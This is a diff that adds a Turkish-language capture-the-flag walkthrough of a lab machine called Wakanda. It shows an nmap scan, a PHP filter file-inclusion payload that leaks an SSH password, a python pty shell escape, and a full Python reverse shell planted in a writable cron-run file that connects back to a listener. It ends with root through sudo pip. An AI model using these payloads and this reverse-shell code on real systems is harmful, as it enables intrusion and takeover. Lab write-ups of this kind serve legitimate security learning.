@@ -1,0 +1,35 @@
+İlk olarak nmap 10.0.2.7/24(mylocaladdres) -sn -T4 çalıştırarak local ağımdaki wakandanın ip addresini öğrendim.
+Daha sonra Wakanda ip sini nmap'de taradım. "nmap 10.0.2.7 -sv -A -T4 -p- "
+Wakanda içinde bir adet 80 http ve 3333 de çalışan ssh servislerini keşfettim.
+
+İnternete giderek 10.0.2.7 yazarak wakandanın web siteni buldum.Daha sonra burda yaptığım araştırmalar sonucu file include açığı olduğunu buldum.
+"10.0.2.7/?lang=pHp://FilTer/convert.base64-encode/resource=index" gidince çıkan Base64 ile encript edilmiş kodu alıp decode ederek ssh login password buldum.Password=Niamey4Ever227!!! 
+Username:mamadou  username web sitenin page source verilmişti. 
+
+Daha sonra teminale giderek "ssh mamadou@10.0.2.7 -p 3333" diyerek ssh serverına bağlandım.Servera bağlandıktan sonra sadece python kodu çalıştırabildiğimi anladım.
+Komut satırana:
+    "import pty"
+    "pty.spawn(/bin/bash)"
+Python ile shell getirme kodunu yazdım.
+Bu işlemleri Yaptıktan sonra Wakanda serverına giriş yaptım. ls çalıştırdığımda flag1.txt gördüm. cat flag1.txt: d86b9ad71ca887f4dd1dac86ba1c4dfc flag1 aldım daha sonra cd/home içinde 
+"devops" diye bir kullanıcı buldum. "cd devops" devops klasorüne girdim içinde flag2.txt gördüm ama o text dosyasını açmaya yetki yoktu. Kendimi devops kullanıcısı yapmaya çalıştım.
+devops kullanıcısının açmaya yetkisi olan dosyaları "find / -user devops " komutu ile listeledim. Birçok dosyayı açmaya yetkim yoktu sadece "/srv/.antivirus.py" lokasyonunda 
+olan dosya mamadou olarak açabiliyordum. Dosyanın konumuna gitim ve python dosyasını açtım python dosyasının içine python reverse_shell getirme kodunu yazdım python kodunuda google dan buldum.
+Python Reverse Shell Kodu
+    import socket
+    import subprocess
+    import os
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.2.0.7",1234))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)    
+    p=subprocess.call(["/bin/sh","-i"])
+Kodu yazdıktan sonra terminal de "nc -nvpl 1234" diyerek dinleme yapmaya başladım.Kod çalışanca artk devops olarak sunucuya giriş yaptım.
+"ls" çalıştırıp flag2.txt:d8ce56398c88e1b4d9e5f83e64c79098 aldım. "sudo -l " çalıştırdığımda sunucuda "/usr/bin/pip" diye bir şey çalıştırdığımı gördüm.
+Google da python pip root diye arama yaptığımda. Fakepip diye bir github reposu buldum bunu git clone ile sunucuya indirdim.İçerini biraz değiştirip .Daha sonra fakepip çalıştırdığımda 
+Sunucuda root oldum.   
+
+
+
+
